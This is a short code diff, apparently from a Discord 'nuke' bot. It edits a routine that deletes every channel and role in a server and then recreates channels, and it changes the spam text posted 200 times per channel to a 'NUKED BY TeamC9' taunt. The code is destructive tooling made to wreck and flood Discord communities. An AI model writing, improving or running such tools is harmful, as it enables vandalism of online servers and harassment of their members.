@@ -72,7 +72,7 @@ async def send_messages_to_channels(guild, name):
         if channel.name == name:
             for _ in range(200):
                 try:
-                    await channel.send("This is a test message.")
+                    await channel.send("@evryone NUKED BY 🤡**TeamC9**🤡")
                     sent_messages += 1
                 except Exception as e:
                     print(f'Error sending message to {channel.name}: {e}')
@@ -97,8 +97,8 @@ async def nuke_guild(guild):
     print(f'{m}Delete Channels:{b}{deleted_channels}')
     delete_roles = await delete_all_roles(guild)
     print(f'{m}Delete Roles:{b}{delete_roles}')
-    created_channels = await create_voice_channels(guild,name)
-    print(f'{m}Create Voice Channels:{b}{created_channels}')
+    created_channels = await create_text_channels(guild,name)
+    print(f'{m}Create Text Channels:{b}{created_channels}')
     #created_roles = await created_roles(guild,name)
     #print(f'{m}Create Roles:{b}{created_roles}')
     print(f'{r}--------------------------------------------\n\n')
